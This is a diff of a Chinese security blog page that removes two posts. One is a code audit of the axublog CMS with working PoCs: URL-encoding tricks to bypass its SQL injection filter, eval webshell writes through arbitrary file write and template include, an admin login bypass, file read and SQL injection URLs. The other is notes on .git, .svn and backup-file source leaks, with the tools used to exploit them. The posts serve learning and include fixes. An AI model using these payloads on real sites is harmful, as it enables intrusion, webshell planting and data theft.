-$sql = mysql_query(&quot;select * from &quot;.$tab.&quot; where id=&quot;.$id);
-$row=mysql_fetch_array($sql);
-    $str=$row[&#39;hit&#39;];
-    echo &#39;document.write(&#39;.$str.&#39;);&#39;;
-    }
-}
-</code></pre><p>我们尝试直接传入payload尝试：</p>
-<pre><code>/hit/php?g=archit&amp;id=1 union select 1,2,3,4,5,6,7,8,9,10,11,12</code></pre><p>发现被拦截。</p>
-<p>我们发现在get传参之前，有一个过滤函数。</p>
-<pre><code>if(sqlguolv()==1){die(&#39;禁止输入特殊符号和非法访问！&#39;);}</code></pre><p>我们找到这个函数：位于axublog\class\c_other.php:690行</p>
-<pre><code>Function sqlguolv() {
-@header(&quot;Content-type:text/html; charset=utf-8&quot;);
-$a=&#39;/%3C|\&lt;|%27|%22|\&gt;|%3E|\||\\\|\;|select|insert|\&quot;|\&#39;|\\*|\*|union|into/i&#39;;
-if(preg_match($a,$_SERVER[&#39;QUERY_STRING&#39;])==11 or preg_match($a,file_get_contents(&quot;php://input&quot;))==11 ){return &quot;1&quot;;}
-}</code></pre><p>_SERVER[‘QUERY_STRING’]获取查询语句，一般是问号后面的字符串，然后使用preg_match()函数来匹配正则表达式。但是有一个问题：</p>
-<p>使用$_SERVER[‘QUERY_STRING’]不会对传入的字符进行URL解码操作，</p>
-<p>而$_GET时候会进行一次URL解码。所以我们可以使用url编码的方式绕过检测。</p>
-<p>我们可以分别对字母u和s进行url编码为：%75 %73，得到paylaod:</p>
-<pre><code>?g=arthit&amp;id=-1%20%75nion%20%73elect%201,2,3,4,5,6,database(),8,9,10,11,12</code></pre><h5 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h5><p>1.加强sqlguolv()的功能，针对 <code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不对URL进行解码的问题进行修复，即增加解码的步骤并完善正则匹配的关键字。</p>
-<pre><code>$_SERVER[&#39;QUERY_STRING&#39;]=urldecode($_SERVER[&#39;QUERY_STRING&#39;]);</code></pre><p>2.因为此次的sql注入为数字型，所以可以直接将id进行强制转换为int型在进行查询。</p>
-<pre><code>$id=intval($id);</code></pre><p>3.使用预编译技术和数据库进行交互。</p>
-<h3 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h3><h5 id="漏洞位置："><a href="#漏洞位置：" class="headerlink" title="漏洞位置："></a>漏洞位置：</h5><p>/ad/theme.php  185~198行</p>
-<h5 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>分析漏洞代码：</p>
-<pre><code>&lt;?php
-@$g=$_GET[&quot;g&quot;];
-?&gt;
-&lt;script src=&quot;jspost.js&quot;&gt;&lt;/script&gt; 
-&lt;/head&gt;
-&lt;body&gt;
-&lt;?php
-    switch ($g)
-    {
-    default:index();break; 
-    case &quot;index&quot;:index();break; 
-    case &quot;savechoose&quot;:savechoose();break; 
-    case &quot;edit&quot;:edit();break; 
-        case &quot;edit2&quot;:edit2();break; 
-        case &quot;edit2save&quot;:edit2save();break; 
-    }</code></pre><p>当我们传入<code>?g=edit2save</code>即可调用edit2save()的函数。</p>
-<p>我们继续观察该函数功能：</p>
-<pre><code>&lt;?php 
-function edit2save(){
-global $themepath;
-?&gt;
-&lt;div class=&quot;yj_green&quot; id=full&gt;
-&lt;b class=&quot;b1&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b2&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b3&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b4&quot;&gt;&lt;/b&gt;
-&lt;div class=&quot;boxcontent&quot;&gt;
-&lt;h2&gt;&lt;a href=&quot;?&quot;&gt;主题管理&lt;/a&gt; &gt; &lt;a href=&quot;javascript:history.go(-2)&quot;&gt;编辑主题&lt;/a&gt; &gt; 编辑文件 &gt; &lt;a href=&quot;javascript:history.back()&quot;&gt;返回&lt;/a&gt;&lt;/h2&gt;
-&lt;/div&gt;
-&lt;div class=&quot;t1&quot;&gt;&lt;div class=&quot;t2&quot;&gt;
-&lt;?php
-$path=$_REQUEST[&#39;path&#39;];
-$content=stripslashes($_REQUEST[&#39;content&#39;]);
-?&gt;
-&lt;p&gt;编辑文件：&lt;?=$path?&gt;&lt;/p&gt;
-&lt;?php
-if($path==&#39;&#39;){echo&#39;文件路径错误！&#39;;exit;}
-
-if(file_put_contents ($path, $content)){echo&quot;保存文件成功！&quot;;} 
-else{echo&quot;保存文件失败！&quot;;}
-?&gt;</code></pre><p>​    在这个方法中，$path和$content分别表示路径和文件内容，用户可控，最后把这两个参数传入file_put_contents中进行保存操作。</p>
-<p>我们可以构造写入webshell的payload:</p>
-<pre><code>?g=edit2save&amp;path=../shell.php&amp;content=&lt;?php%20@eval($_POST[cmd]);?&gt;</code></pre><p>成功拿到webshell.</p>
-<h5 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h5><p>我们根据上下函数可知，此处调用该函数的目的是为了about页面：</p>
-<p>所以我们可以对path进行白名单校验，或者直接将路径写死：</p>
-<pre><code>if($path!=&#39;../theme/default/about.mb&#39;){
-    echo &#39;about.mb地址不正确&#39;;
-    exit;
-}</code></pre><h3 id="后台生成about页面getshell"><a href="#后台生成about页面getshell" class="headerlink" title="后台生成about页面getshell"></a>后台生成about页面getshell</h3><h5 id="漏洞位置：-1"><a href="#漏洞位置：-1" class="headerlink" title="漏洞位置："></a>漏洞位置：</h5><p>/ad/html.php 773行~787行</p>
-<h5 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><pre><code>ob_start();
-include($mb);
-$html = ob_get_contents ();
-ob_clean();
-$html=mbreplace($html);
-file_put_contents ($cache, $html);
-
-echo &#39;生成about.html成功: &lt;a target=blank href=&quot;&#39;.$cache.&#39;&quot;&gt;访问&lt;/a&gt;&#39;;
-?&gt;
-&lt;/div&gt;&lt;/div&gt;
-&lt;b class=&quot;b4b&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b3b&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b2b&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b1b&quot;&gt;&lt;/b&gt;
-&lt;/div&gt;
-&lt;?php
-}
-?&gt;</code></pre><p>这里使用include函数包含about.mb将其中php的语句执行后再将一些标签替换成变量的值，最后把处理的结果放入<code>$cache</code>变量中再将其写入<code>aout.html</code>页面。</p>
-<p>我们在about.mb尾部添加如下代码：</p>
-<pre><code>&lt;?php 
-file_put_contents(&#39;../shell.php&#39;,&#39;&lt;?php @eval($_GET[&quot;a&quot;]); ?&gt;&#39;); 
-?&gt;</code></pre><p>然后使用菜刀连接即可getshell。</p>
-<h4 id="后台登录处的sql注入漏洞"><a href="#后台登录处的sql注入漏洞" class="headerlink" title="后台登录处的sql注入漏洞"></a>后台登录处的sql注入漏洞</h4><h5 id="漏洞分析：-3"><a href="#漏洞分析：-3" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>首先分析其login.php页面，发现用户名和密码输入后是使用的jsloginpost函数进行处理的。jsloginpost函数是在c_login.php文件中定义的。</p>
-<p><img src="1587018-20200303210401433-2074327058.png" alt=""></p>
-<p>打开c_login.php页面，分析jsloginpost代码，发现jsloginpost并没有对user和psw进行过滤处理，而是直接带入了sql语句进行查询，所以此处造成了sql注入漏洞。</p>
-<p><img src="1587018-20200303211200124-595595133%5B1%5D.png" alt=""></p>
-<h5 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p>我们只需要在后台管理员登录处使用万能密码即可成功登录，例如</p>
-<pre><code>user:admin&#39; or 1=1#
-psw: 随意
-或者
-user: admin&#39; or 1#
-psw: 随意</code></pre><p><img src="1587018-20200303211645255-577074129%5B1%5D.png" alt=""></p>
-<h4 id="前台反射型xss漏洞"><a href="#前台反射型xss漏洞" class="headerlink" title="前台反射型xss漏洞"></a>前台反射型xss漏洞</h4><h5 id="漏洞分析：-4"><a href="#漏洞分析：-4" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>此漏洞是搜索功能处的xss漏洞，由于在search.php中对word参数没有过滤而产生的。首先分析search.php文件，在文件中首先获取搜索数据给word参数，然后进行判断，如果没有传参数，则直接调用index()函数，如果传递了参数则调用so()函数。</p>
-<p><img src="1587018-20200303232615102-565416911%5B1%5D.png" alt=""></p>
-<p>进入so()函数继续分析：在so()函数中也没有对word参数进行任何过滤处理，而是包含了一个模板文件search.mb，继续跟进模板文件：</p>
-<p><img src="1587018-20200303234054140-229902481%5B1%5D.png" alt=""></p>
-<p><img src="1587018-20200303233948167-467235758%5B1%5D.png" alt=""></p>
-<p>模板文件search.mb分析：发现在模板文件中也是直接对word参数直接输出，而没有任何过滤，所以此处就造成了xss漏洞</p>
-<p><img src="1587018-20200303234320733-213715566%5B1%5D.png" alt=""></p>
-<h5 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p><img src="1587018-20200303234506377-737313316.png" alt="img"></p>
-<h4 id="前台sql注入漏洞"><a href="#前台sql注入漏洞" class="headerlink" title="前台sql注入漏洞"></a>前台sql注入漏洞</h4><p>在第二个分析xss漏洞的过程中发现，在其模板文件search.mb中还调用了searchlist()函数，继续跟进searchlist()函数（searchlist函数在search.php文件中）</p>
-<p><img src="1587018-20200303234835707-2141296773.png" alt="img"></p>
-<p>发现在searchlist()函数中同样没有对word参数进行过滤，而直接带入了sql语句进行查询，所以此处就造成了sql注入漏洞。</p>
-<p>漏洞利用：</p>
-<pre><code>执行如下poc时候返回正确结果：
-http://192.168.110.152/axublog/search.php?word=广%&#39; or 1=1--+
-执行如下poc时候无结果返回：
-http://192.168.110.152/axublog/search.php?word=广%&#39; or 1=2--+</code></pre><h4 id="后台任意文件写入漏洞"><a href="#后台任意文件写入漏洞" class="headerlink" title="后台任意文件写入漏洞"></a>后台任意文件写入漏洞</h4><p>注明：这个后台文件上传漏洞不需要登录后台即可直接getshell</p>
-<p>漏洞点：admin/theme.php</p>
-<p><img src="1587018-20200304002821492-309441952.png" alt=""></p>
-<p>edit2save()函数进行了文件的写入操作，将REQUEST请求的的path参数和content参数分别作为作为报存的路径和内容传入file_put_contents中进行保存操作。</p>
-<p>继续寻找edit2save()函数调用点：发现当g=edit2save时调用该函数。</p>
-<p><img src="1587018-20200304003116729-1307171520.png" alt="img"></p>
-<h5 id="漏洞利用：-2"><a href="#漏洞利用：-2" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><pre><code>请求：
-http://192.168.110.152/axublog/admin/theme.php?g=edit2save
-
-post:
-path=./shell.php&amp;content=&lt;?php phpinfo();?&gt;</code></pre><p><img src="1587018-20200304003256803-1334544380.png" alt="img"></p>
-<h4 id="后台多个sql注入漏洞"><a href="#后台多个sql注入漏洞" class="headerlink" title="后台多个sql注入漏洞"></a>后台多个sql注入漏洞</h4><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>漏洞点：admin/admin.php</p>
-<p>定位edit()函数，发现id参数没有经过过滤而直接带入sql语句进行查询了。</p>
-<p><img src="1587018-20200304172222897-1426655107.png" alt="img"></p>
-<p>但是这里在获取id参数之前调用了chkoutpost()函数进行验证。跟进chkoutpost()函数。class/c_other.php</p>
-<p><img src="1587018-20200304172533350-1121177041.png" alt="img"></p>
-<p>chkoutpost()函数仅仅验证了refer是否为空的情况，所以我们在利用这个sql注入漏洞是时候给refer随便赋个值即可。</p>
-<p>查看edit函数在哪里被调用了：发现当g=edit时候调用edit函数。</p>
-<p><img src="1587018-20200304172752867-937007122.png" alt="img"></p>
-<h5 id="漏洞利用：-3"><a href="#漏洞利用：-3" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><pre><code>poc:
-http://192.168.110.152/axublog/admin/admin.php?g=edit&amp;id=1 union select 1,version(),3,4--+
-
-Referer: 任意填写</code></pre><p><img src="1587018-20200304172922428-724640530.png" alt="img"></p>
-<p>6，既然这个cms的sql注入都没有进行防御，那么肯定还存在n个sql注入漏洞，此处就不一一说明了。</p>
-<h4 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h4><p>漏洞点：admin/app.php</p>
-<p>首先定位到edit2()函数，在edit2函数中通过调用file_get_contents函数获取变量path文件中的内容，然而变量path文件中的内容，然而变量path的值是通过request的方式从path参数获取的，并且对变量$path没有任何过滤而直接带入到file_get_contents函数进行获取文件内容，所以此处就造成了任意文件读取漏洞。</p>
-<p><img src="1587018-20200304173840167-1365630191.png" alt="img"></p>
-<p>跟进edit2()函数，寻找调用方法：当g=edit2的时候调用edit2函数。</p>
-<p><img src="1587018-20200304174437952-1224821444.png" alt="img"></p>
-<p>漏洞利用：</p>
-<pre><code>poc:
-http://192.168.110.152/axublog/admin/app.php?g=edit2&amp;path=./app.php</code></pre><p><img src="1587018-20200304174618584-506013891.png" alt=""></p>
-<h4 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h4><p>漏洞点：admin/html.php</p>
-<p>漏洞分析：在生成about页面的时候调用了ob_get_contents函数执行about.mb里面的php代码，并且没有进行任何过滤，所以我们可以通过向about.md文件中写入php代码，从而使其被执行。然而在后台管理页面中正好有编辑about页功能。</p>
-<p><img src="1587018-20200304210913536-1220729563.png" alt="img"></p>
-<p>漏洞利用：</p>
-<p>首先编辑about页，然后向其中写入想要执行的php代码即可，此处我使用file_put_contents函数生成一个文件名为shell2.php的探针文件。</p>
-<p><img src="1587018-20200304211607584-434322337.png" alt="img"></p>
-<p>保存编辑后选择生成about：</p>
-<p><img src="1587018-20200304211905560-277463672.png" alt="img"></p>
-<p>然后我们的代码就被成功的执行了，访问shell2.php:</p>
-<p><img src="1587018-20200304212324112-1387100175.png" alt="img"></p>
-<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="http://www.ttk7.cn/post-82.html" target="_blank" rel="noopener">http://www.ttk7.cn/post-82.html</a></p>
-<p><a href="https://blog.csdn.net/sweet0swat/article/details/89056383" target="_blank" rel="noopener">https://blog.csdn.net/sweet0swat/article/details/89056383</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/19/min-gan-xin-xi-xie-lu-chang-jian-lei-xing/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Shu1L">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/header.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/19/min-gan-xin-xi-xie-lu-chang-jian-lei-xing/" itemprop="url">敏感信息泄露常见类型</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-19T18:33:38+08:00">
-                2020-04-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
-                    <span itemprop="name">web漏洞学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="敏感信息泄露-源码泄露-学习笔记"><a href="#敏感信息泄露-源码泄露-学习笔记" class="headerlink" title="敏感信息泄露/源码泄露  学习笔记"></a>敏感信息泄露/源码泄露  学习笔记</h2><h4 id="1-什么是敏感数据？"><a href="#1-什么是敏感数据？" class="headerlink" title="1.什么是敏感数据？"></a>1.什么是敏感数据？</h4><p>  敏感数据包括但不限于：口令、密钥、证书、会话标识、Licence、隐私数据、授权凭据、个人数据等、在程序文件、配置文件、日志文件、备份文件及数据库中都有可能包含敏感数据。</p>
-<h4 id="1、-git文件泄露漏洞"><a href="#1、-git文件泄露漏洞" class="headerlink" title="1、.git文件泄露漏洞"></a>1、.git文件泄露漏洞</h4><p><strong>漏洞描述：</strong>git在初始化项目的时候，会在项目的根目录（git rev-parse  –show-toplevel查看）创建一个名为<code>.git</code>的隐藏文件夹，里面包含了本地所有commit的历史纪录，如果无意间将这个目录置于Web的路径下让用户可以访问，那么也就泄露了几乎所有的源代码和其他的敏感信息。可能泄露的内容：</p>
-<ul>
-<li>所有该项目的源码</li>
-<li>私有仓库的地址</li>
-<li>私密的配置信息。</li>
-<li>所有commiter的邮箱账号信息</li>
-<li>内部的账号和密码。。</li>
-</ul>
-<p><strong>检测方式：</strong>   工具：GitHack  使用方法：</p>
-<p>​                 <code>python GitHack.py  http://网站地址/.git/</code></p>
-<p><strong>示例：</strong>来源(i春秋web Hello world);</p>
-<p>进入题目，查看源码，只发现一个js文件</p>
-<img src="QQ截图20200119121609.png" style="zoom:50%;" />
-
-<p>我们尝试使用Githack来判断网站是否有.git泄露。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200119121109.png" alt=""></p>
-<p>可见该网站下存在.git泄露，并且在工具文件夹下得到了泄露的文件内容。</p>
-<img src="QQ截图20200119121116.png" style="zoom:50%;" />
-
-<h4 id="2、-hg源码泄露漏洞"><a href="#2、-hg源码泄露漏洞" class="headerlink" title="2、.hg源码泄露漏洞"></a>2、.hg源码泄露漏洞</h4><p><strong>漏洞描述：</strong><a href="https://www.mercurial-scm.org/" target="_blank" rel="noopener">Mercurial</a>的意思是水银, 所以缩写成hg(汞), 也是一个版本管理软件. 用法和git有点类似, 但也保留了svn命令简明的特点, 而且原生地支持Windows/MacOS/Linux三大平台, 不像git需要MinGW才得以运行, 所以当今也有不少人偏向于用hg做版本控制.</p>
-<p><strong>检测方式：</strong>工具dvcs-ripper,使用方法：<code>rip-hg.pl -v -u http://域名/.hg/</code></p>
-<h4 id="3、DS-Store源码泄露漏洞"><a href="#3、DS-Store源码泄露漏洞" class="headerlink" title="3、DS_Store源码泄露漏洞"></a>3、DS_Store源码泄露漏洞</h4><p><strong>漏洞描述：</strong>在发布代码时，没有删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息，<a href="http://www.xxx.com/.ds_store" target="_blank" rel="noopener">http://www.xxx.com/.ds_store</a></p>
-<p><strong>检测方式：</strong>dsstoreexp,使用方式：<code>python ds_store_exp.py http://域名/.Ds.store</code></p>
-<h4 id="4、robots导致文件泄露"><a href="#4、robots导致文件泄露" class="headerlink" title="4、robots导致文件泄露"></a>4、robots导致文件泄露</h4><p><strong>漏洞描述：</strong>搜索引擎可以通过robots文件获知哪些页面可以爬取，哪些页面不可以爬取。Robots协议是网站国际互联网通行的道德规范。其目的是保护网站数据和明杆信息 、确保用户个人信息和隐私不被侵犯，如果robots.txt文件太过详细，反而会泄露网站的敏感目录或者文件，比如网站后台路径，从而得知其使用的系统类型，从而有针对性地进行利用。</p>
-<p><strong>检测方式：</strong>1.我们可以直接使用御剑进行后台扫描，或者直接用爬虫进行爬取，从而找到robots.txt文件。</p>
-<p>​                   2.直接在网站URL输入/robots.txt进行查看。</p>
-<p><strong>修复方案：</strong>为了不让robots.txt中的内容不泄露网站的后台和隐私，我们可以使用星号（*）作为通配符进行设置。例如限制访问我们的后台admin目录，则规则为：</p>
-<p>​       <img src="QQ截图20200119110404.png" style="zoom: 80%;" /></p>
-<p>​             当我们又不想泄露我们的敏感目录时，我们可以使用星号(*)作为通配符即可。</p>
-<img src="QQ截图20200119110727.png" style="zoom:80%;" />
-
-<p>​                 </p>
-<h4 id="5、备份文件泄露漏洞"><a href="#5、备份文件泄露漏洞" class="headerlink" title="5、备份文件泄露漏洞"></a>5、备份文件泄露漏洞</h4><p><strong>漏洞描述：</strong>备份文件泄露又分为两种情况, 一种是运维人员偷懒地直接在网站根目录用类似<code>tar -czvf    bakup.tgz</code>的命令将网站进行备份,<br> 这样整站的源代码都能直接被用户打包下载了； 另一种是开发或者运维人员使用的编辑器修改文件时自动备份了所编辑的网页内容,<br> 如vim的<code>.swp</code>, 从而泄露了该网页的源代码。<br><strong>检测方式：</strong>常见的备份文件后缀名：直接在URL中进行检测。</p>
-<pre><code>*.rar    *.zip   *.7z   *.tar.gz   *.bak   *.swp   *.txt   *.html</code></pre><p>​                   或者使用工具比如AWVS进行扫描。</p>
-<p><strong>修复方案：</strong>做好版本管理, 并利用版本管理工具过滤掉这些类型的文件, 同时不要直接在生产环境中修改或者添加文件</p>
-<h4 id="6、phpinfo-）信息泄露漏洞"><a href="#6、phpinfo-）信息泄露漏洞" class="headerlink" title="6、phpinfo(）信息泄露漏洞"></a>6、phpinfo(）信息泄露漏洞</h4><p><strong>漏洞描述</strong>：Web站点的某些测试页面可能会使用到PHP的phpinfo()函数，会输出服务器的关键信息。</p>
-<img src="sec_hole_13.png" style="zoom:67%;" />
-
-<p><strong>检测方式 ：</strong>访问<a href="http://ip/phpinfo.php看是否成功。" target="_blank" rel="noopener">http://ip/phpinfo.php看是否成功。</a></p>
-<p><strong>修复方案 ：</strong>删除该PHP文件。</p>
-<h4 id="7、SVN文件泄露漏洞"><a href="#7、SVN文件泄露漏洞" class="headerlink" title="7、SVN文件泄露漏洞"></a>7、SVN文件泄露漏洞</h4><p><strong>漏洞描述：</strong>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p>
-<p><strong>漏洞检测：</strong> </p>
-<p>1.漏洞利用工具： Seay SVN漏洞利用工具</p>
-<p>2、添加网站url</p>
-<p>在被利用的网址后面加 /.svn/entries，列出网站目录，甚至下载整站。</p>
-<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1.不要使用svn checkout和svn up更新服务器上的代码，使用svn export（导出）功能代替。</p>
-<p>2.服务器软件（Nginx、apache、tomcat、IIS等）设置目录权限，禁止访问.svn目录</p>
-<p>m’g</p>
-<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://ninjia.gitbook.io/secskill/web/info" target="_blank" rel="noopener">https://ninjia.gitbook.io/secskill/web/info</a></p>
-<p><a href="https://blog.csdn.net/wy_97/article/details/78165051" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/78165051</a></p>
-<p><a href="https://www.cnblogs.com/Hydraxx/p/10762512.html" target="_blank" rel="noopener">https://www.cnblogs.com/Hydraxx/p/10762512.html</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2893,7 +3356,7 @@ http://192.168.110.152/axublog/admin/app.php?g=edit2&amp;path=./app.php</code></
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-count">46</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2904,7 +3367,7 @@ http://192.168.110.152/axublog/admin/app.php?g=edit2&amp;path=./app.php</code></
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
